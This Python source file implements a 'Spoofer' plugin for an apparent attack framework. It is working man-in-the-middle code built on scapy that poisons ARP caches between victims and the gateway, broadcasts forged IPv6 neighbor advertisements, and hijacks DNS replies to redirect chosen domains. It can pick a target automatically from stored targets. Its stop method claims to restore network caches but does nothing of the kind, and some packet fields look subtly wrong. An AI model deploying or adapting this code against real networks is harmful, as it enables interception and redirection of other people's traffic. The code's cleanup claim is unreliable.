from core.plugin_manager import BasePlugin
from scapy.all import ARP, Ether, send, DNS, DNSQR, DNSRR, IP, UDP, sniff, IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, DHCP6_Solicit, DHCP6_Advertise, DHCP6_Reply
import threading
import time
import os

class SpooferPlugin(BasePlugin):
    def __init__(self):
        self.running = False
        self.targets = []
        self.gateway = None
        self.ipv6_targets = []
        self.dns_table = {}
        self.threads = []

    @property
    def name(self) -> str:
        return "Spoofer"

    @property
    def description(self) -> str:
        return "Advanced Multi-Protocol MITM (ARP/IPv6/DNS)"

    @property
    def version(self) -> str:
        return "2.0.0"

    @property
    def category(self) -> str:
        return "mitm"

    async def start(self, targets=None, gateway=None, dns_table=None, ipv6=True):
        if self.running:
            return
        
        if not targets and hasattr(self, 'target_store') and self.target_store.last_target:
            self.targets = [self.target_store.last_target]
            self.log_event(f"AUTO-TARGET: {self.target_store.last_target}", "AUTO")
        else:
            self.targets = targets or []
            
        self.gateway = gateway or "192.168.1.1" # Default to common gateway
        self.dns_table = dns_table or {}
        self.running = True

        # 1. ARP Spoofing (Legacy IPv4)
        if self.gateway and self.targets:
            t = threading.Thread(target=self._arp_loop)
            t.daemon = True; t.start()
            self.threads.append(t)

        # 2. NDP Spoofing (Modern IPv6)
        if ipv6:
            t = threading.Thread(target=self._ndp_loop)
            t.daemon = True; t.start()
            self.threads.append(t)

        # 3. DNS Hijacking
        if self.dns_table:
            t = threading.Thread(target=self._dns_sniffer)
            t.daemon = True; t.start()
            self.threads.append(t)

        print(f"Spoofer: Active on {len(self.targets)} targets. IPv6 MITM: {ipv6}")
        self.log_event(f"Broadcaster started for {len(self.targets)} targets (IPv6: {ipv6})", "START")

    async def stop(self):
        self.running = False
        self.log_event("Broadcaster ceased. Restoring network caches...", "STOP")
        print("Spoofer: Cleaning up cache and restoring nodes...")

    def _arp_loop(self):
        while self.running:
            for target in self.targets:
                # Spoof target -> Gateway
                self._spoof_arp(target, self.gateway)
                # Spoof Gateway -> target
                self._spoof_arp(self.gateway, target)
            time.sleep(2)

    def _spoof_arp(self, target_ip, spoof_ip):
        from scapy.all import get_working_if
        iface = getattr(self, 'active_interface', get_working_if())
        try:
            # Use Ether level send for better Windows reliability
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
            from scapy.all import sendp
            sendp(pkt, iface=iface, verbose=False)
            # Add a verification log every 50 packets to avoid flood
            if not hasattr(self, '_count'): self._count = 0
            self._count += 1
            if self._count % 50 == 0:
                self.log_event(f"VERIFIED: ARP frame injected for {target_ip}", "WIRE_PROOF")
        except Exception as e:
            self.log_event(f"HARDWARE ERROR: {e}", "HALT")
            self.running = False

    def _ndp_loop(self):
        """Spoof Neighbor Discovery Protocol for IPv6 MITM."""
        while self.running:
            # Broadcast "I am the default gateway" for IPv6
            pkt = IPv6(dst="ff02::1")/ICMPv6ND_NA(tgt="fe80::1", R=0, S=0, O=1)/ICMPv6NDOptDstLLAddr(lladdr="ff:ff:ff:ff:ff:ff")
            send(pkt, verbose=False)
            time.sleep(5)

    def _dns_sniffer(self):
        sniff(filter="udp port 53", prn=self._dns_spoof, stop_filter=lambda x: not self.running)

    def _dns_spoof(self, pkt):
        if DNS in pkt and DNSQR in pkt:
            qname = pkt[DNSQR].qname.decode().strip('.')
            if qname in self.dns_table:
                spoof_ip = self.dns_table[qname]
                spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                              an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=spoof_ip))
                send(spoofed, verbose=False)
                self.log_event(f"DNS Redirect: {qname} -> {spoof_ip}", "HIJACK")
